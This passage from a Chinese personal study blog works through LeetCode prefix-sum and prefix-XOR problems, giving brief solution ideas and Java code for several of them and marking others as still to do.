<h3 id="2845-统计趣味子数组的数目"><a href="#2845-统计趣味子数组的数目" class="headerlink" title="2845. 统计趣味子数组的数目"></a><a href="https://leetcode.cn/problems/count-of-interesting-subarrays/">2845. 统计趣味子数组的数目</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">countInterestingSubarrays</span><span class="params">(List&lt;Integer&gt; nums, <span class="type">int</span> mod, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.size();</span><br><span class="line">        <span class="type">int</span> []cnt = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">s</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x % mod == k)</span><br><span class="line">                s = (s + <span class="number">1</span>) % mod;</span><br><span class="line">            <span class="type">int</span> <span class="variable">s2</span> <span class="operator">=</span> (s - k + mod) % mod;</span><br><span class="line">            <span class="keyword">if</span> (s2 &lt;= n)</span><br><span class="line">                ans += cnt[s2];</span><br><span class="line">            cnt[s]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较简单，直接CV了</p>
<h3 id="1442-形成两个异或相等数组的三元组数目"><a href="#1442-形成两个异或相等数组的三元组数目" class="headerlink" title="1442. 形成两个异或相等数组的三元组数目"></a><a href="https://leetcode.cn/problems/count-triplets-that-can-form-two-arrays-of-equal-xor/">1442. 形成两个异或相等数组的三元组数目</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">换汤不换药</span><br><span class="line">也是就异或结果为0的长度大于等于2的子数组个数,并且记录下标</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countTriplets</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; mapCountSum = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Integer, Integer&gt; mapIndexSum = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">preXorSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">countSum</span> <span class="operator">=</span> mapCountSum.getOrDefault(preXorSum ^ arr[i], <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">indexSum</span> <span class="operator">=</span> mapIndexSum.getOrDefault(preXorSum ^ arr[i], <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (countSum &gt; <span class="number">0</span>) res += countSum * i - indexSum;</span><br><span class="line">            mapCountSum.merge(preXorSum, <span class="number">1</span>, Integer::sum);</span><br><span class="line">            mapIndexSum.merge(preXorSum, i, Integer::sum);</span><br><span class="line">            preXorSum ^= arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2025-分割数组的最多方案数"><a href="#2025-分割数组的最多方案数" class="headerlink" title="2025. 分割数组的最多方案数"></a><a href="https://leetcode.cn/problems/maximum-number-of-ways-to-partition-an-array/">2025. 分割数组的最多方案数</a></h3><p>todo</p>
<h3 id="2949-统计美丽子字符串-II"><a href="#2949-统计美丽子字符串-II" class="headerlink" title="2949. 统计美丽子字符串 II"></a><a href="https://leetcode.cn/problems/count-beautiful-substrings-ii/">2949. 统计美丽子字符串 II</a></h3><p>todo</p>
<h2 id="距离和"><a href="#距离和" class="headerlink" title="距离和"></a>距离和</h2><h3 id="1685-有序数组中差绝对值之和"><a href="#1685-有序数组中差绝对值之和" class="headerlink" title="1685. 有序数组中差绝对值之和"></a><a href="https://leetcode.cn/problems/sum-of-absolute-differences-in-a-sorted-array/">1685. 有序数组中差绝对值之和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">非递减，那么可以前缀和了。即常规定义preSum</span><br><span class="line">有result[i]=nums[i]*i - preSum[i] + (preSum[n]-preSum[i+1])-nums[i]*(n-1-i)</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line"><span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    preSum[i + <span class="number">1</span>] = preSum[i] + nums[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    res[i] = nums[i] * i - preSum[i] + preSum[n] - preSum[i + <span class="number">1</span>] - nums[i] * (n - <span class="number">1</span> - i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure>

<p>跟着题单做还是爽，中等题感觉跟简单题差不多</p>
<h3 id="2615-等值距离和"><a href="#2615-等值距离和" class="headerlink" title="2615. 等值距离和"></a><a href="https://leetcode.cn/problems/sum-of-distances/">2615. 等值距离和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉得维护4个hash表，一个是左边及当前相同数字得坐标和</span><br><span class="line">另外一个是右边数字相同数字得坐标和，最后是个数和</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span>[] distance(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; numLeftCountMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; numRightCountMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Integer, Long&gt; leftIndexSumMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Integer, Long&gt; rightIndexSumMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            numRightCountMap.merge(nums[i], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            rightIndexSumMap.merge(nums[i], (<span class="type">long</span>) i, Long::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span>[] res = <span class="keyword">new</span> <span class="title class_">long</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">leftCount</span> <span class="operator">=</span> numLeftCountMap.getOrDefault(nums[i], <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">rightCount</span> <span class="operator">=</span> numRightCountMap.getOrDefault(nums[i], <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (leftCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">leftIndexSum</span> <span class="operator">=</span> leftIndexSumMap.get(nums[i]);</span><br><span class="line">                res[i] += (<span class="type">long</span>) leftCount * i - leftIndexSum;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (rightCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">rightIndexSum</span> <span class="operator">=</span> rightIndexSumMap.get(nums[i]);</span><br><span class="line">                res[i] += rightIndexSum - (<span class="type">long</span>) rightCount * i;</span><br><span class="line">            &#125;</span><br><span class="line">            leftIndexSumMap.merge(nums[i], (<span class="type">long</span>) i, Long::sum);</span><br><span class="line">            rightIndexSumMap.merge(nums[i], (<span class="type">long</span>) -i, Long::sum);</span><br><span class="line">            numLeftCountMap.merge(nums[i], <span class="number">1</span>, Integer::sum);</span><br><span class="line">            numRightCountMap.merge(nums[i], -<span class="number">1</span>, Integer::sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2602-使数组元素全部相等的最少操作次数"><a href="#2602-使数组元素全部相等的最少操作次数" class="headerlink" title="2602. 使数组元素全部相等的最少操作次数"></a><a href="https://leetcode.cn/problems/minimum-operations-to-make-all-array-elements-equal/">2602. 使数组元素全部相等的最少操作次数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果queries[i]大于等于数组最大值，或者小于等于数组最小值，那么很简单。</span><br><span class="line">现在要考虑的是在中间呢（靠我还以为是区间整体加一减一，都要猜贪心了）</span><br><span class="line"></span><br><span class="line">因为每次变一个，又有query，现在想的是怎样减少计算次数了</span><br><span class="line">数组排序，二分找边界，前缀和计算</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Long&gt; <span class="title function_">minOperations</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span>[] queries)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">long</span>[] preSum = <span class="keyword">new</span> <span class="title class_">long</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            preSum[i + <span class="number">1</span>] = preSum[i] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        List&lt;Long&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (queries[i] &gt;= nums[n - <span class="number">1</span>]) &#123;</span><br><span class="line">                res.add((<span class="type">long</span>) queries[i] * n - preSum[n]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (queries[i] &lt;= nums[<span class="number">0</span>]) &#123;</span><br><span class="line">                res.add(preSum[n] - (<span class="type">long</span>) queries[i] * n);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">                <span class="comment">//nums[low]&lt;=nums[mid]&lt;nums[right]</span></span><br><span class="line">                <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;<span class="comment">//low&lt;mid&lt;=high</span></span><br><span class="line">                    <span class="keyword">if</span> (nums[mid] &lt;= queries[i]) &#123;</span><br><span class="line">                        low = mid;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        high = mid - <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                res.add((<span class="type">long</span>) (low + <span class="number">1</span>) * queries[i] - preSum[low + <span class="number">1</span>] + (preSum[n] - preSum[low + <span class="number">1</span>]) - (<span class="type">long</span>) (n - low - <span class="number">1</span>) * queries[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2968-执行操作使频率分数最大"><a href="#2968-执行操作使频率分数最大" class="headerlink" title="2968. 执行操作使频率分数最大"></a><a href="https://leetcode.cn/problems/apply-operations-to-maximize-frequency-score/">2968. 执行操作使频率分数最大</a></h3><p>todo</p>
<h3 id="1703-得到连续-K-个-1-的最少相邻交换次数"><a href="#1703-得到连续-K-个-1-的最少相邻交换次数" class="headerlink" title="1703. 得到连续 K 个 1 的最少相邻交换次数"></a><a href="https://leetcode.cn/problems/minimum-adjacent-swaps-for-k-consecutive-ones/">1703. 得到连续 K 个 1 的最少相邻交换次数</a></h3><p>todo</p>
<h3 id="3086-拾起-K-个-1-需要的最少行动次数"><a href="#3086-拾起-K-个-1-需要的最少行动次数" class="headerlink" title="3086. 拾起 K 个 1 需要的最少行动次数"></a><a href="https://leetcode.cn/problems/minimum-moves-to-pick-k-ones/">3086. 拾起 K 个 1 需要的最少行动次数</a></h3><p>todo</p>
<h2 id="前缀异或和"><a href="#前缀异或和" class="headerlink" title="前缀异或和"></a>前缀异或和</h2><h3 id="1310-子数组异或查询"><a href="#1310-子数组异或查询" class="headerlink" title="1310. 子数组异或查询"></a><a href="https://leetcode.cn/problems/xor-queries-of-a-subarray/">1310. 子数组异或查询</a></h3><p>前缀和裸题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sum[right+1] = a^b</span><br><span class="line">sum[left] = a</span><br><span class="line">a^b^a = b</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] xorQueries(<span class="type">int</span>[] arr, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="type">int</span>[] xorPreSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            xorPreSum[i + <span class="number">1</span>] = xorPreSum[i] ^ arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            res[i] = xorPreSum[queries[i][<span class="number">0</span>]] ^ xorPreSum[queries[i][<span class="number">1</span>] + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1177-构建回文串检测"><a href="#1177-构建回文串检测" class="headerlink" title="1177. 构建回文串检测"></a><a href="https://leetcode.cn/problems/can-make-palindrome-from-substring/">1177. 构建回文串检测</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">肯定是前缀和。但想想怎样定义了</span><br><span class="line">单词转成数字，异或下</span><br><span class="line">然后可以通过</span><br><span class="line">a&amp;(a-1)获取1得个数</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Boolean&gt; <span class="title function_">canMakePaliQueries</span><span class="params">(String s, <span class="type">int</span>[][] queries)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span>[] xorSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            xorSum[i + <span class="number">1</span>] = xorSum[i] ^ (<span class="number">1</span> &lt;&lt; (s.charAt(i) - <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        List&lt;Boolean&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> queries[i][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> queries[i][<span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> queries[i][<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">tempXorSum</span> <span class="operator">=</span> xorSum[right + <span class="number">1</span>] ^ xorSum[left];</span><br><span class="line">            <span class="type">int</span> <span class="variable">oneBitCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (tempXorSum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                tempXorSum &amp;= (tempXorSum - <span class="number">1</span>);</span><br><span class="line">                oneBitCount++;</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(oneBitCount &lt;= k*<span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1371-每个元音包含偶数次的最长子字符串"><a href="#1371-每个元音包含偶数次的最长子字符串" class="headerlink" title="1371. 每个元音包含偶数次的最长子字符串"></a><a href="https://leetcode.cn/problems/find-the-longest-substring-containing-vowels-in-even-counts/">1371. 每个元音包含偶数次的最长子字符串</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这种奇偶的都做出套路了，直接异或就行了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTheLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;e&#x27;</span>, <span class="number">1</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;i&#x27;</span>, <span class="number">1</span> &lt;&lt; <span class="number">3</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;o&#x27;</span>, <span class="number">1</span> &lt;&lt; <span class="number">4</span>);</span><br><span class="line">        map.put(<span class="string">&#x27;u&#x27;</span>, <span class="number">1</span> &lt;&lt; <span class="number">5</span>);</span><br><span class="line">        Map&lt;Integer, Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();<span class="comment">//记录前缀和以及index</span></span><br><span class="line">        record.put(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">preXorSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            preXorSum ^= map.getOrDefault(s.charAt(i), <span class="number">0</span>);</span><br><span class="line">            res = Integer.max(res, i - record.getOrDefault(preXorSum, Integer.MAX_VALUE));</span><br><span class="line">            record.merge(preXorSum, i, Integer::min);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="1542-找出最长的超赞子字符串"><a href="#1542-找出最长的超赞子字符串" class="headerlink" title="1542. 找出最长的超赞子字符串"></a><a href="https://leetcode.cn/problems/find-longest-awesome-substring/">1542. 找出最长的超赞子字符串</a></h3><p>todo</p>
<h3 id="1915-最美子字符串的数目"><a href="#1915-最美子字符串的数目" class="headerlink" title="1915. 最美子字符串的数目"></a><a href="https://leetcode.cn/problems/number-of-wonderful-substrings/">1915. 最美子字符串的数目</a></h3><p>代码</p>
<p>不像中等题啊，之后在做（太菜了）</p>
<p>todo</p>
<h3 id="2791-树中可以形成回文的路径数"><a href="#2791-树中可以形成回文的路径数" class="headerlink" title="2791. 树中可以形成回文的路径数"></a><a href="https://leetcode.cn/problems/count-paths-that-can-form-a-palindrome-in-a-tree/">2791. 树中可以形成回文的路径数</a></h3><p>todo</p>
<h2 id="其它一维度前缀和"><a href="#其它一维度前缀和" class="headerlink" title="其它一维度前缀和"></a>其它一维度前缀和</h2><h3 id="1895-最大的幻方"><a href="#1895-最大的幻方" class="headerlink" title="1895. 最大的幻方"></a><a href="https://leetcode.cn/problems/largest-magic-square/">1895. 最大的幻方</a></h3><p>todo中等</p>
<p>有点难之后做</p>
<h3 id="1878-矩阵中最大的三个菱形和"><a href="#1878-矩阵中最大的三个菱形和" class="headerlink" title="1878. 矩阵中最大的三个菱形和"></a><a href="https://leetcode.cn/problems/get-biggest-three-rhombus-sums-in-a-grid/">1878. 矩阵中最大的三个菱形和</a></h3><p>todo中等</p>
<p>有点难之后做</p>
<h3 id="2245-转角路径的乘积中最多能有几个尾随零"><a href="#2245-转角路径的乘积中最多能有几个尾随零" class="headerlink" title="2245. 转角路径的乘积中最多能有几个尾随零"></a><a href="https://leetcode.cn/problems/maximum-trailing-zeros-in-a-cornered-path/">2245. 转角路径的乘积中最多能有几个尾随零</a></h3><p>todo中等</p>
<p>有点难之后做</p>
<h3 id="1712-将数组分成三个子数组的方案数"><a href="#1712-将数组分成三个子数组的方案数" class="headerlink" title="1712. 将数组分成三个子数组的方案数"></a><a href="https://leetcode.cn/problems/ways-to-split-array-into-three-subarrays/">1712. 将数组分成三个子数组的方案数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跟区域和相关，需要先预先计算出前缀和数组</span><br><span class="line"></span><br><span class="line">从左到右枚举left 直到preSum[left + 1] * 2 &gt; preSum[n] - presum[left + 1]</span><br><span class="line">固定left 后二分查找mid的范围，然后就可以了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">waysToSplit</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] preSum = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        preSum[i + <span class="number">1</span>] = preSum[i] + nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>; left &lt;= n - <span class="number">3</span> &amp;&amp; preSum[left + <span class="number">1</span>] * <span class="number">3</span> &lt;= preSum[n]; left++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> getMidMinVal(left, preSum);</span><br><span class="line">        <span class="keyword">if</span> (minVal == -<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxVal</span> <span class="operator">=</span> getMidMaxVal(left, preSum);</span><br><span class="line">        <span class="keyword">if</span>(maxVal == -<span class="number">1</span>) <span class="keyword">break</span>;;</span><br><span class="line">        res += (maxVal - minVal + <span class="number">1</span>);</span><br><span class="line">        log.debug(<span class="string">&quot;left:&#123;&#125;,minVal:&#123;&#125;,maxVal:&#123;&#125;&quot;</span>,left,minVal,maxVal);</span><br><span class="line">        res %= MOD_NUM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>) res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getMidMinVal</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span>[] preSum)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> preSum.length - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//2*preSum[left+1]&lt;=preSum[mid+1]&lt;=(preSum[n] + preSum[left+1])/2</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> left + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> n - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;<span class="comment">//low&lt;=mid&lt;high</span></span><br><span class="line">        <span class="keyword">if</span> (preSum[mid + <span class="number">1</span>] &lt; <span class="number">2</span> * preSum[left + <span class="number">1</span>]) &#123;</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preSum[low + <span class="number">1</span>] &gt;= <span class="number">2</span> * preSum[left + <span class="number">1</span>]) <span class="keyword">return</span> low;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getMidMaxVal</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span>[] preSum)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> preSum.length - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//2*preSum[left+1]&lt;=preSum[mid+1]&lt;=(preSum[n] + preSum[left+1])/2</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> left + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> n - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;<span class="comment">//low&lt;mid&lt;=high</span></span><br><span class="line">        <span class="keyword">if</span> (preSum[mid + <span class="number">1</span>] &lt;= (preSum[n] + preSum[left + <span class="number">1</span>]) / <span class="number">2</span>) &#123;</span><br><span class="line">            low = mid;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 